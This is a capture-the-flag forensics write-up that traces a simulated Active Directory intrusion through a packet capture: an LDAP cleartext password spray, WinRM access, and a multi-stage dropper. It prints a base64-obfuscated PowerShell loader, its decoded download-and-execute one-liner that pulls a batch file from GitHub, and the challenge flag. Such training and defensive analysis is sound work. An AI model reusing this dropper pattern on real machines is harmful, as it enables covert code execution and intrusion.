# Lagenda Sultan Kedah Tua

- **Event:** Bahtera Siber 2026
- **Category:** Forensics
- **Difficulty:** Medium

---

## 1. Challenge Description

> The first Sultan of Kedah, Phra Ong Mahawangsa, left behind more than just a kingdom. A simulated network intrusion targeting a modern Active Directory domain — `kedah.tua` — has been captured. Your mission is to perform digital forensics on the provided packet capture to trace the attacker's footsteps and recover the hidden flag.

The challenge provides a single packet capture file: `Kedah_Tua.pcap`. The goal is to analyze the network traffic, reconstruct the attack chain, and extract the flag.

---

## 2. Initial Reconnaissance & Analysis

Our first step is to load `Kedah_Tua.pcap` and get a high-level overview of the traffic.

**Key hosts identified:**

| IP | Role |
|----|------|
| `192.168.99.99` | Attacker |
| `192.168.99.10` | Domain Controller (`KEDAH-DC`) |
| `192.168.99.1` | pfSense Firewall |
| `100.65.0.212` | Attacker's external HTTP server |

**Protocols observed:** HTTP, LDAP (port 389), SMB/NTLMSSP (port 445), Kerberos (port 88), WinRM (port 5985), DNS (port 53)

---

## 3. Exploitation & Solution

### Step 1 — LDAP Cleartext Password Spray

Filtering for LDAP `bindRequest` packets on port 389 reveals the attacker performing a password spray against `s.sulaimanshah@kedah.tua` using **Simple (cleartext) authentication**.

Since LDAP Simple bind over plain port 389 transmits credentials without encryption, the password is fully visible in the packet bytes:

```
Packet #2778 → s.sulaimanshah@kedah.tua : "pass"      → FAILED
Packet #2812 → s.sulaimanshah@kedah.tua : "P@ssw0rd"  → SUCCESS
```

Raw bytes from packet #2812 confirm the cleartext credential:
```
\x80\x08  50 40 73 73 77 30 72 64  →  "P@ssw0rd"
```

> The `\x80` tag denotes LDAP `simple` authentication (Context[0]), transmitting the password unencrypted.

---

### Step 2 — WinRM Lateral Movement

Following the successful LDAP bind, the attacker authenticates to `KEDAH-DC` over **WinRM (port 5985)** using `s.muzaffarshah` — a second account discovered during LDAP directory enumeration. A Kerberos TGT exchange on port 88 confirms the session was established successfully, granting the attacker a remote shell on the domain controller.

---

### Step 3 — Malicious PowerShell Download

Inspecting HTTP traffic reveals an unusual outbound GET request originating from the Domain Controller itself (packet #3762):

```
GET /update.ps1 HTTP/1.1
Host: 100.65.0.212
User-Agent: WindowsPowerShell/5.1
```

The attacker's server responds with a PowerShell script disguised as a "System Health Loader":

```powershell
# System Health Loader

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Loading system diagnostic module..." -ForegroundColor Cyan

$payload = "aXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mNHJzaGFkMHcvY2hlY2t1cC1zY3JpcHQvcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5iYXQgLU91dEZpbGUgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0OyBTdGFydC1Qcm9jZXNzIGNtZCAtQXJncyAiL2MgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0Ig=="

$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
Invoke-Expression $cmd

Write-Host "[*] Done." -ForegroundColor Green
```

---

### Step 4 — Base64 Decode

The Base64 `$payload` variable conceals the true command. We write a quick Python script to decode it:

#### `solve.py`

```python
import base64

payload = "aXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mNHJzaGFkMHcvY2hlY2t1cC1zY3JpcHQvcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5iYXQgLU91dEZpbGUgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0OyBTdGFydC1Qcm9jZXNzIGNtZCAtQXJncyAiL2MgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0Ig=="

decoded = base64.b64decode(payload).decode("utf-8")
print("[+] Decoded command:", decoded)
```

Running this reveals:

```
[+] Decoded command: iwr https://raw.githubusercontent.com/f4rshad0w/checkup-script/refs/heads/main/script.bat
    -OutFile $env:TEMP\WindowsUpdate.bat; Start-Process cmd -Args "/c $env:TEMP\WindowsUpdate.bat"
```

The script silently downloads and executes `script.bat` from the attacker's public GitHub repository `f4rshad0w/checkup-script`, disguised as a Windows Update.

---

### Step 5 — Flag Extraction from script.bat

Fetching `script.bat` from the GitHub repository reveals the following:

```bat
@echo off
:: System Checkup Script

title sys check
color 0a

echo checking stuff...

:: session token - dont change this or the tracker breaks again
reg add "HKCU\Software\SysDiag\Session" /v Token /t REG_SZ /d "}asgn4wah4m_gn0r3m_tayak1h{8013" /f >nul
reg query "HKCU\Software\SysDiag\Session" /v Token

:: read flag
set flag=%USERPROFILE%\Desktop\flag.txt
if exist "%flag%" (type "%flag%") else (echo no flag.txt on desktop)
```

The registry token value `}asgn4wah4m_gn0r3m_tayak1h{8013` is the flag written **in reverse**. We reverse it:

```python
s = "}asgn4wah4m_gn0r3m_tayak1h{8013"
print(s[::-1])
# Output: 3108{h1kayat_m3r0ng_m4haw4ngsa}
```

---

## 4. Flag

`3108{h1kayat_m3r0ng_m4haw4ngsa}`

> `h1kayat_m3r0ng_m4haw4ngsa` = **Hikayat Merong Mahawangsa** — the legendary Malay chronicle documenting the origins of the Kedah Sultanate, perfectly matching the challenge theme.

---

## 5. Key Takeaways

- **LDAP Simple Bind is Dangerous:** Using unencrypted LDAP (port 389) with Simple authentication transmits credentials in cleartext, making them trivially recoverable from any network capture. Always use LDAPS (port 636) or enforce SASL/Kerberos authentication.
- **Multi-Stage Droppers Evade Detection:** The attacker chained a local HTTP server → Base64-obfuscated PS1 → GitHub-hosted BAT to make attribution and detection harder. Each stage appears benign in isolation.
- **Steganographic Reversal:** Storing the flag reversed in a registry write command is a simple but effective anti-grep technique — raw string searches for `3108{` will miss it entirely.
- **Mitigation:** Monitor outbound PowerShell `Invoke-WebRequest` calls, restrict WinRM access, enforce LDAP signing/channel binding, and audit registry writes to `HKCU\Software` paths from non-interactive processes.
